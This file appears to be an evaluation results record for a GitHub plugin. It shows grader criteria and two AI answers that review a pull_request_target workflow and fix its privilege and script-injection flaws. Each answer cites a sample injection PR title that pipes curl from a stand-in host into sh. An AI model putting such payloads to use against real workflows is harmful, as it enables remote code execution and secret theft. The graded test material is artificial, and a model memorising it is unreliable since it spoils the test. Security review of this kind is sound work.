@@ -1,0 +1,139 @@
+{
+  "schemaVersion": 1,
+  "claudeVersion": "2.1.286",
+  "startedAt": "2026-10-02T21:27:10.356Z",
+  "durationSeconds": 20,
+  "costUsd": 0.1518456,
+  "partial": false,
+  "suite": {
+    "root": "/home/buck/Projects/adminhead/claude-plugins/plugins/github",
+    "ablation": "with-without",
+    "caseFilter": "task-*",
+    "threshold": 1,
+    "concurrency": 3,
+    "plugins": [
+      {
+        "name": "github",
+        "version": "0.2.0",
+        "path": "/home/buck/Projects/adminhead/claude-plugins/plugins/github"
+      }
+    ]
+  },
+  "cases": [
+    {
+      "name": "task-workflow-prt",
+      "dir": "evals/task-workflow-prt",
+      "source": "mixed",
+      "promptMarkdown": "Our public repo at `/home/buck/Projects/adminhead/claude-plugins/plugins/github/evals/task-workflow-prt/fixture` runs this PR check on every pull request, including ones from forks. It works, but please review the workflow and give me a corrected version.",
+      "model": "claude-sonnet-5-5",
+      "runsPerCase": 1,
+      "timeoutSeconds": 300,
+      "maxTurns": 10,
+      "graders": [
+        {
+          "name": "fires-skill",
+          "type": "tool_used",
+          "weight": 1,
+          "config": {
+            "tool": "Skill",
+            "input_match": "\"skill\"\\s*:\\s*\"github:actions\""
+          }
+        },
+        {
+          "name": "trust-boundary",
+          "type": "llm",
+          "weight": 1,
+          "graderMarkdown": "Rule: under `pull_request_target`, never check out or run PR-controlled code in the privileged job; use `pull_request` for untrusted PR CI. Never interpolate untrusted PR fields into `run:`. Grant least-privilege `permissions`.\n\nPASS only if the answer does ALL of these:\n1. Identifies that `pull_request_target` plus checkout of the PR head SHA plus `npm ci` / `scripts/check.sh` runs fork-controlled code with write permissions and `DEPLOY_TOKEN` available.\n2. The corrected workflow no longer runs PR code in a privileged context: it switches the test job to `pull_request` without secrets (any commenting step moved to a separate unprivileged-code job or `workflow_run` that does not execute PR code), or equivalent.\n3. Removes `permissions: write-all` in favor of minimal scoped permissions, and stops passing `DEPLOY_TOKEN` to the PR job.\n4. Flags or removes the `${{ github.event.pull_request.title }}` interpolation inside `run:` as script injection (pass through `env:` instead).\nFAIL if it keeps executing PR code under `pull_request_target`, only adds an approval label gate, or misses the script injection. Do not reward length.",
+          "config": {
+            "criteria": "Rule: under `pull_request_target`, never check out or run PR-controlled code in the privileged job; use `pull_request` for untrusted PR CI. Never interpolate untrusted PR fields into `run:`. Grant least-privilege `permissions`.\n\nPASS only if the answer does ALL of these:\n1. Identifies that `pull_request_target` plus checkout of the PR head SHA plus `npm ci` / `scripts/check.sh` runs fork-controlled code with write permissions and `DEPLOY_TOKEN` available.\n2. The corrected workflow no longer runs PR code in a privileged context: it switches the test job to `pull_request` without secrets (any commenting step moved to a separate unprivileged-code job or `workflow_run` that does not execute PR code), or equivalent.\n3. Removes `permissions: write-all` in favor of minimal scoped permissions, and stops passing `DEPLOY_TOKEN` to the PR job.\n4. Flags or removes the `${{ github.event.pull_request.title }}` interpolation inside `run:` as script injection (pass through `env:` instead).\nFAIL if it keeps executing PR code under `pull_request_target`, only adds an approval label gate, or misses the script injection. Do not reward length.",
+            "focus": "last_message"
+          }
+        }
+      ],
+      "arms": {
+        "with": [
+          {
+            "score": 1,
+            "passed": true,
+            "turns": 9,
+            "costUsd": 0.09407199999999999,
+            "judgeCostUsd": 0.008652,
+            "durationSeconds": 20,
+            "startedAt": "2026-10-02T21:27:10.368Z",
+            "error": null,
+            "tracePath": "/tmp/claude-eval-6pkuFi/out/trace.jsonl",
+            "skippedPaidGraders": false,
+            "graders": [
+              {
+                "name": "fires-skill",
+                "passed": true,
+                "weight": 1,
+                "explanation": "Skill called 1x (expected 1..∞)",
+                "withOnly": true,
+                "scored": false
+              },
+              {
+                "name": "trust-boundary",
+                "passed": true,
+                "weight": 1,
+                "explanation": "judge votes: PASS PASS PASS",
+                "withOnly": false,
+                "scored": true,
+                "judgeVotes": [
+                  true,
+                  true,
+                  true
+                ],
+                "evidence": "I haven't edited the file. Below are the problems I found and a corrected `pr-check.yml`.\n\n## Problems\n\n1. **`pull_request_target` with a checkout of the PR head, then `npm ci` and `./scripts/check.sh`.** This is the critical one. A fork's PR can change `package.json` (lifecycle scripts) or `check.sh`, and that code then runs with a write token and your secrets. `pull_request_target` is meant for privileged work that never touches PR code. It isn't a safe way to test a PR.\n2. **`permissions: write-all`.** The job only needs to read the repo.\n3. **`DEPLOY_TOKEN` is exposed to the test step.** The tests don't need it, and it's the secret an attacker would go after through problem 1. Untrusted PR code should never see it.\n4. **Script injection in \"Announce\".** `${{ github.event.pull_request.title }}` is interpolated straight into the shell. A title like `\"; curl evil|sh #` would execute. Untrusted values belong in `env:`.\n5. **The comment step.** It needs `issues` or `pull-requests: write`, and on fork PRs a `pull_request` token is read-only, so it would fail. A \"Checks passed.\" comment is also redundant with the check status. I replaced it with a job summary.\n6. **Smaller hardening.**\n   - `synchronize` and `opened` miss `reopened`.\n   - There's no `persist-credentials: false`.\n   - There's no timeout or concurrency control.\n   - `checkout` with the head SHA isn't needed. `pull_request` checks out the merge commit by default.\n\n## Corrected workflow\n\n```yaml\nname: PR check\n\non:\n  pull_request:\n    types: [opened, synchronize, reopened]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: pr-check-${{ github.event.pull_request.number }}\n  cancel-in-progress: true\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n\n      - name: Announce\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"Checking PR: $PR_TITLE\"\n\n      - name: Install and test\n        run: |\n          npm ci\n          ./scripts/check.sh\n\n      - name: Summary\n        run: echo \"Checks passed.\" >> \"$GITHUB_STEP_SUMMARY\"\n```\n\n## Notes\n\n- **Secrets:** fork PRs don't get secrets under `pull_request`, and the check doesn't need any. If `DEPLOY_TOKEN` is used for deploys, keep that in a separate workflow that runs on `push` to `main`, ideally with an environment and approval rules.\n- **PR comments from forks:** if you really want a comment, use a separate `workflow_run` workflow that has `pull-requests: write`. It must never check out or execute PR code, and it should treat any artifact from the PR run as untrusted data. I'd skip it unless you need it.\n- **Action versions:** I kept `actions/checkout@v4` to match the repo's `@vN` tag convention. I didn't check whether a newer major exists, so run `gh release view --repo actions/checkout` if you want the latest.\n- **Not verified:** I didn't run `actionlint` or execute the workflow. Hosted behavior, such as fork-token permissions, needs a real fork PR to confirm.\n- **Secret rotation:** `DEPLOY_TOKEN` has been exposed to fork-controlled code on every run so far. Check the run history for suspicious PRs, and consider rotating it.\n\nWant me to write this into `.github/workflows/pr-check.yml`?"
+              }
+            ]
+          }
+        ],
+        "without": [
+          {
+            "score": 1,
+            "passed": true,
+            "turns": 5,
+            "costUsd": 0.0577736,
+            "judgeCostUsd": 0.006002,
+            "durationSeconds": 19,
+            "startedAt": "2026-10-02T21:27:10.368Z",
+            "error": null,
+            "tracePath": "/tmp/claude-eval-rsoeI3/out/trace.jsonl",
+            "skippedPaidGraders": false,
+            "graders": [
+              {
+                "name": "trust-boundary",
+                "passed": true,
+                "weight": 1,
+                "explanation": "judge votes: PASS PASS PASS",
+                "withOnly": false,
+                "scored": true,
+                "judgeVotes": [
+                  true,
+                  true,
+                  true
+                ],
+                "evidence": "I haven't changed any files. The workflow has several serious problems, and I've put a corrected version below.\n\n## Problems\n\n1. **Untrusted code runs with privileges (critical).** `pull_request_target` runs in the base repo's context with secrets and a write token. Checking out `head.sha` and then running `npm ci` and `./scripts/check.sh` means a fork PR can edit `package.json` (for example a `postinstall` script) or `check.sh`. That code would run with your secrets and a write token. This is the classic \"pwn request\".\n2. **`DEPLOY_TOKEN` is exposed to PR code.** A check job has no reason to hold a deploy secret.\n3. **`permissions: write-all`** gives every step far more access than it needs.\n4. **Script injection.** `${{ github.event.pull_request.title }}` is interpolated straight into the shell script. A title like `\"; curl evil.sh | sh #` runs arbitrary commands. Pass it through `env:` instead.\n5. **Smaller issues.** Actions are pinned to tags rather than SHAs. There's no `concurrency` group or timeout. The comment would be posted from a job that ran untrusted code. `checkout` also persists credentials by default.\n\n## Corrected version\n\nThe fix splits the workflow in two. The first runs the untrusted code with no secrets and a read-only token. The second does the privileged commenting and never checks out or runs PR code.\n\n`.github/workflows/pr-check.yml`\n```yaml\nname: PR check\n\non:\n  pull_request:\n    types: [opened, synchronize]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: pr-check-${{ github.event.pull_request.number }}\n  cancel-in-progress: true\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4   # pin to a commit SHA in practice\n        with:\n          persist-credentials: false\n\n      - name: Announce\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"Checking PR: $PR_TITLE\"\n\n      - name: Install and test\n        run: |\n          npm ci\n          ./scripts/check.sh\n\n      - name: Save PR number\n        run: echo \"${{ github.event.pull_request.number }}\" > pr-number.txt\n\n      - uses: actions/upload-artifact@v4   # pin to a commit SHA in practice\n        with:\n          name: pr-result\n          path: pr-number.txt\n```\n\n`.github/workflows/pr-comment.yml`\n```yaml\nname: PR comment\n\non:\n  workflow_run:\n    workflows: [\"PR check\"]\n    types: [completed]\n\npermissions:\n  actions: read          # download the artifact\n  pull-requests: write   # post the comment\n\njobs:\n  comment:\n    if: github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - uses: actions/download-artifact@v4   # pin to a commit SHA in practice\n        with:\n          name: pr-result\n          run-id: ${{ github.event.workflow_run.id }}\n          github-token: ${{ github.token }}\n\n      - uses: actions/github-script@v7   # pin to a commit SHA in practice\n        with:\n          script: |\n            const fs = require('fs');\n            const issue_number = parseInt(fs.readFileSync('pr-number.txt', 'utf8').trim(), 10);\n            if (!Number.isInteger(issue_number)) throw new Error('Bad PR number');\n            await github.rest.issues.createComment({\n              ...context.repo,\n              issue_number,\n              body: \"Checks passed.\",\n            });\n```\n\n## Notes\n\n- **The artifact is untrusted input.** It comes from fork-controlled code, which is why the comment job parses it as an integer and does nothing else with it.\n- **`workflow_run` only fires from the default branch.** Changes to `pr-comment.yml` take effect only after they're merged.\n- **`DEPLOY_TOKEN` is no longer in the PR path.** If you need it for deploys, run that on `push` to `main` or in a protected environment with required reviewers.\n- **Rotate `DEPLOY_TOKEN` if you can.** The old workflow has been exposed to any fork PR, so check the Actions logs for suspicious runs.\n- **Repo settings to review.** Under Settings → Actions, set \"Fork pull request workflows\" to require approval for first-time contributors, and set the default `GITHUB_TOKEN` permission to read-only.\n\nWant me to write these files into the fixture?"
+              }
+            ]
+          }
+        ]
+      },
+      "aggregates": {
+        "score": 1,
+        "passRate": 1,
+        "scoreWithout": 1,
+        "passRateWithout": 1,
+        "delta": 0
+      }
+    }
+  ],
+  "aggregates": {
+    "casesTotal": 1,
+    "casesPassed": 1,
+    "overallScore": 1,
+    "overallPassRate": 1,
+    "meanDelta": 0
+  }
+}
